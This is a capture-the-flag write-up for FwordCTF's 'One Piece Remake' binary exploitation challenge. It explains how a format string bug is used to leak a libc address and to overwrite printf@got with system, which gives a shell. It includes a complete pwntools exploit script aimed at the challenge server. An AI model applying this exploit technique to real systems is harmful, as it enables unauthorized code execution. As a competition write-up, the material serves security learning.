# One Piece Remake

The binary has no protections except Partial RELRO.

The menu has 3 options besides exiting, one of which is secret.

We can read into a shellcode pointer, but only 5 bytes get read. We can execute said shellcode. This is all pretty much useless since 5 bytes of shellcode is not enough to do literally anything useful.

There's a secret option - gomugomunomi. It reads 100 bytes of input\(no BOF\) and then printfs it, allowing us to execute the classic format string exploit.

I tried to do the simple %p leak, but found no useful addresses on the stack. Instead, I used %s to read my buffer\(offset 7, found through pwntools automation\) as an address of a string in order to read got entries.

By doing gotaddress + %7$s we can leak got addresses to get a libc leak. We'll use libc-database find yet again to get the remote libc, libc6\_2.30-0ubuntu2.2\_i386

Then, we'll execute a got overwrite attack by overwriting printf@got with system. Next gomugomunomi, the input will be system'd, so we enter /bin/sh to get dropped into a shell.

But it's not over! On the remote, there is no cat. The solution to read flag.txt is simple - `while read line; do echo $line; done < flag.txt`

This reveals the flag.

1. gotaddress+ %7$s to leak libc
2. Format string overwrite to map printf to system
3. In gomugomunomi, send /bin/sh
4. Use while read line; do echo $line; done to read the flag file as cat is nonexistent

## Flag: FwordCTF{i\_4m\_G0inG\_t0\_B3coM3\_th3\_p1r4Te\_K1NG}

```python
from pwn import *
e = ELF("./remake")
libc = e.libc if args.LOCAL else ELF("/home/kali/Tools/libc-database/libs/libc6_2.30-0ubuntu2.2_i386/libc.so.6")
def getproc():
    return e.process() if args.LOCAL else remote('onepiece.fword.wtf', 1236)
def dofmt(data):
    p.sendline(b"gomugomunomi")
    p.recvuntil(b">>")
    p.sendline(data)
    output = p.recvline()
    p.recvuntil(b">>")
    return output
def write_fmt(data):
    proc = getproc()
    proc.recvuntil(b">>")
    proc.sendline("gomugomunomi")
    proc.recvuntil(b">>")
    proc.send(data)
    output = proc.recvline()
    proc.close()
    return output
auto = FmtStr(write_fmt)
p = getproc()
p.recvuntil(b">>")
string = b"/bin/sh\x00"
payload = p32(e.got['puts']) + b'%7$s'
output = dofmt(payload)[4:8]
libcleak = u32(output)
log.info(f"Libc leak: {hex(libcleak)}")
libcbase = libcleak - libc.symbols['puts']
log.info(f"Libc base: {hex(libcbase)}")
libc.address = libcbase
# Overwrite printf@got with system@GLIBC
payload = fmtstr.fmtstr_payload(auto.offset,{e.got['printf']: libc.symbols['system']})
p.sendline(b"gomugomunomi")
p.recvuntil(b">>")
p.sendline(payload)
p.clean()
p.sendline(b"gomugomunomi")
p.recvline()
p.sendline(b"/bin/sh")
p.interactive()
```

